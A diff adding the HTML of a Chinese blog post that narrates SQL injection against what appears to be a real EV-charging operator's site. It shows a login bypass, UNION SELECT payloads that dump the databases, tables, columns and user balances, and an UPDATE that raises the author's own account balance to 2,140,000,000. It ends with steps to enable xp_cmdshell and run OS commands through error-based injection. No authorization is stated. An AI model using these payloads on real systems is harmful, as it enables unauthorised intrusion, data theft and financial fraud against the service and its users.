@@ -1,0 +1,183 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>MSSQL渗透测试过程(上) | ascotbe</title><meta name="description" content="MSSQL渗透测试过程(上)"><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="MSSQL渗透测试过程(上)"><meta name="twitter:description" content="MSSQL渗透测试过程(上)"><meta name="twitter:image" content="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/16.jpg"><meta property="og:type" content="article"><meta property="og:title" content="MSSQL渗透测试过程(上)"><meta property="og:url" content="https://www.ascotbe.com/2019/01/30/MSSQLPenetrationTest_01/"><meta property="og:site_name" content="ascotbe"><meta property="og:description" content="MSSQL渗透测试过程(上)"><meta property="og:image" content="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/16.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = '2'
+var t = Cookies.get("theme");
+if (autoChangeMode == '1'){
+const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+if (t === undefined){
+  if (isLightMode) activateLightMode()
+  else if (isDarkMode) activateDarkMode()
+  else if (isNotSpecified || hasNoSupport){
+    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+    now = new Date();
+    hour = now.getHours();
+    isNight = hour < 6 || hour >= 18
+    isNight ? activateDarkMode() : activateLightMode()
+}
+} else if (t == 'light') activateLightMode()
+else activateDarkMode()
+
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://www.ascotbe.com/2019/01/30/MSSQLPenetrationTest_01/"><link rel="prev" title="MSSQL渗透测试过程(下)" href="https://www.ascotbe.com/2019/02/03/MSSQLPenetrationTest_02/"><link rel="next" title="制作隐藏的管理员账户" href="https://www.ascotbe.com/2019/01/14/MakeAHiddenAdministratorAccount/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.ascotbe.com/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    title: 'Snackbar.bookmark.title',
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: false,
+  isHome: false,
+  isPost: true
+  
+}</script><meta name="generator" content="Hexo 4.2.1"></head><body><canvas class="fireworks"></canvas><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">ascotbe</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">92</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#开始准备工作"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">开始准备工作</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">振奋人心的发现</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.2.</span> <span class="toc_mobile_items-text">查询的后的一些基础信息</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.3.</span> <span class="toc_mobile_items-text">查询当前所有的数据库</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.4.</span> <span class="toc_mobile_items-text">查询当前数据库中的全部表(部分表截图)</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.5.</span> <span class="toc_mobile_items-text">查询表中是否有数据(查询行)</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.6.</span> <span class="toc_mobile_items-text">表+表中的行</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.7.</span> <span class="toc_mobile_items-text">查询表中的全部列名</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.8.</span> <span class="toc_mobile_items-text">查询表中列的数据</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.9.</span> <span class="toc_mobile_items-text">修改金额</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.10.</span> <span class="toc_mobile_items-text">尝试getshell</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#"><span class="toc_mobile_items-number">1.11.</span> <span class="toc_mobile_items-text">最后记个小TOP：</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#开始准备工作"><span class="toc-number">1.</span> <span class="toc-text">开始准备工作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.1.</span> <span class="toc-text">振奋人心的发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.2.</span> <span class="toc-text">查询的后的一些基础信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.3.</span> <span class="toc-text">查询当前所有的数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.4.</span> <span class="toc-text">查询当前数据库中的全部表(部分表截图)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.5.</span> <span class="toc-text">查询表中是否有数据(查询行)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.6.</span> <span class="toc-text">表+表中的行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.7.</span> <span class="toc-text">查询表中的全部列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.8.</span> <span class="toc-text">查询表中列的数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.9.</span> <span class="toc-text">修改金额</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.10.</span> <span class="toc-text">尝试getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.11.</span> <span class="toc-text">最后记个小TOP：</span></a></li></ol></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://gitee.com/asc0t6e/Random-img/raw/master/Blog/16.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">MSSQL渗透测试过程(上)</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2019-01-30<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2020-03-09</time><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h2 id="开始准备工作"><a href="#开始准备工作" class="headerlink" title="开始准备工作"></a>开始准备工作</h2><ul>
+<li>用什么nmap,awvs,vooli,ibm一堆工具搞了一遍发现没啥有用的信息</li>
+<li>然后直接打开网站只有一个后台，这样只能看下能不能后台注入</li>
+</ul>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/01.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/01.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p>如上图显示是有注入点的试下'or '1'='1'--直接进去了</p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/02.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/02.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p>结果发现后台啥功能都没有就几张图</p>
+<p>然后转去搞APP去了，发现APP都是些泄露账户密码什么的没啥好玩的</p>
+<h3>振奋人心的发现</h3>
+<p>在Fiddler中抓到了一些奇怪的JS文件打开一看好多网址，都是我用IBM没扫描出来的东西，在一堆网址中找到了一个网页可以使用</p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/03.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/03.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p>用老方法测试发现存在注入点如图</p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/04.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/04.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p>我们用order by 猜字段得出有12个字段</p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/05.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/05.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p>接着构造语句查询数据库版本数据库权限等信息</p>
+<p>'union select null,null,null,null,@@version,null,null,null,null,null,null,null --   查询数据库版本</p>
+<p>'union select null,null,null,null,system_user,null,null,null,null,null,null,null --   用户权限</p>
+<h3>查询的后的一些基础信息</h3>
+<p>system_user  sa</p>
+<p>@@version    Microsoft SQL Server 2012 (SP4) (KB4018073) - 11.0.7001.0 (X64) Aug 15 2017 10:23:29 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.3 (Build 9600: )</p>
+<p>@@servername WIN-SF2MD4VM4JT</p>
+<p>host_name() WIN-RG8BCEM932D</p>
+<h3>查询当前所有的数据库</h3>
+<p>111'union select null,null,null,null,name,null,null,null,null,null,null,null from master..sysdatabases--</p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/06.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/06.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<h3>查询当前数据库中的全部表(部分表截图)</h3>
+<p>'union select null,null,null,null,name,null,null,null,null,null,null,null from sysobjects where xtype='U' and category=0 -- </p>
+<h3>查询表中是否有数据(查询行)</h3>
+<p>'union select null,null,null,null,count(1),null,null,null,null,null,null,null from Server_IN_UserRecharge--</p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E6%9C%89%E6%97%A0%E6%95%B0%E6%8D%AE.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E6%9C%89%E6%97%A0%E6%95%B0%E6%8D%AE.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<h3>表+表中的行</h3>
+<p>c13b</p>
+<p>Server_AccountTradeRecord   39309</p>
+<p>Server_AlipayData             17446</p>
+<p>Server_BatteryType</p>
+<p>Server_DT_BatteryDiagnosticCATLData</p>
+<p>Server_DT_CarTypeInformation   67</p>
+<p>Server_DT_BatteryDiagnosticData</p>
+<p>Server_DT_ChargingPileStatusData      1804426</p>
+<p>Server_DT_CostAccount   1</p>
+<p>Server_DT_Dictionary     22</p>
+<p>Server_DT_DictionaryData  104</p>
+<p>Server_DT_FeedbackData   28</p>
+<p>Server_DT_GroupCustomersData</p>
+<p>Server_DT_IncomeAccount           1</p>
+<p>Server_DT_InvoiceInformation</p>
+<p>Server_DT_ServerErrorLogData    5829</p>
+<p>Server_DT_SmsCodeData    302</p>
+<p>Server_DT_UserCarInformation     140</p>
+<p>Server_IN_ChargingPileInformation  7</p>
+<p>Server_IN_ChargingStationInformation 2</p>
+<p>Server_IN_CouponInformation      2</p>
+<p>Server_IN_DBServerConnection  3</p>
+<p>Server_IN_DeviceBindChargingStation</p>
+<p>Server_IN_DeviceInformation 11</p>
+<p>Server_IN_ElectricityStatistics      4</p>
+<p>Server_IN_IC   1</p>
+<p>Server_IN_IntegralRule</p>
+<p>Server_IN_Menu_RoleInformation   109</p>
+<p>Server_IN_ProvincesAndCity    47187</p>
+<p>Server_IN_PushMsgData       226</p>
+<p>Server_IN_ReceiveAddressInformation      41</p>
+<p>Server_IN_RoleInformation   3</p>
+<p>Server_IN_Shop</p>
+<p>Server_IN_SignIn</p>
+<p>Server_IN_StationValuationProgram  10</p>
+<p>Server_IN_SystemConfigurationInfo</p>
+<p>Server_IN_Town           41835</p>
+<p>Server_IN_User_RoleInformation    6</p>
+<p>Server_IN_UserInformation        81</p>
+<p>Server_IN_UserPushConfig          36</p>
+<p>Server_IN_UserRecharge</p>
+<p>Server_IN_ValuationProgram  24</p>
+<p>Server_NE_MenuInformation     64</p>
+<p>Server_Reservation         58</p>
+<p>Server_ReserveRecord</p>
+<p>Server_UserAccount     80 </p>
+<p>Server_DT_ChargeWarnData      1</p>
+<p>Server_DT_ChargeData            12248</p>
+<p>后面一个表一个表猜去哪里有金额数据，最后在Server_UserAccount 这个表中找到了金额</p>
+<h3>查询表中的全部列名</h3>
+<p>'union select null,null,null,null,name,null,null,null,null,null,null,null FROM SysColumns Where id=Object_Id('Server_UserAccount')--  </p> 
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/07.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/07.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<h3>查询表中列的数据</h3>
+<p>11111'union select null,null,Amount,User_id,2,3,null,4,null,null,null,null FROM Server_UserAccount-- </p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/08.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/08.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<h3>修改金额</h3>
+<p>找到自己的用户ID这个我是在APP的返回包中抓到的</p>
+<p>Update 表名 set 字段=值 where 条件</p>
+<p>Update Server_UserAccount  set Amount=2140000000 where User_id=5317--</p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/09.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/09.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E4%B9%8B%E5%89%8D.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E4%B9%8B%E5%89%8D.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E5%90%8E.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E5%90%8E.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+
+<h3>尝试getshell</h3>
+<p>改网站站库分离+没有上传点+不知道是装了360还是配置错误尽然用xp_cmdshell错误</p>
+<p>原理我是个菜鸡，各位大佬轻喷，顺便提提有什么思路让我学习学习</p>
+<h3>最后记个小TOP：</h3>
+<p>'union select null,null,null,null,x,null,null,null,null,null,null,null from xx--   查询创建好表的数据</p>
+<p>'create table xx(x nvarchar(max))-- 在数据库中创建XX的表列为X</p>
+<p>用着4局话开启XP_CMDSHELL</p>
+<p>sp_configure 'show advanced options',1</p>
+<p>reconfigure</p>
+<p>sp_configure 'xp_cmdshell',1</p>
+<p>reconfigure</p>
+<p>接着用报错注入法</p>
+<p>'begin try exec master..xp_cmdshell'whoami' end try begin catch insert into xx select ERROR_MESSAGE() end catch-- 在数据库中插入exec master..xp_cmdshell'whoami'然后查询该表得到回显</p>
+
+<p>参考博客:<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ascotbe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com/2019/01/30/MSSQLPenetrationTest_01/">https://www.ascotbe.com/2019/01/30/MSSQLPenetrationTest_01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ascotbe.com">ascotbe</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/16.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/02/03/MSSQLPenetrationTest_02/"><img class="prev_cover lazyload" data-src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/47.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>MSSQL渗透测试过程(下)</span></div></a></div><div class="next-post pull_right"><a href="/2019/01/14/MakeAHiddenAdministratorAccount/"><img class="next_cover lazyload" data-src="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/44.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>制作隐藏的管理员账户</span></div></a></div></nav></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2020 By ascotbe</div><span>呐呐呐ฅ(๑*д*๑)ฅ到底啦~</span><div class="icp"><a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"><span>闽ICP备20002178号-1</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/fireworks.js"></script><script id="ribbon_piao" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/click_heart.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Bronya.model.json"},"display":{"position":"right","width":400,"height":500,"hOffset":-110,"vOffset":-40},"mobile":{"show":false},"log":false});</script></body></html>
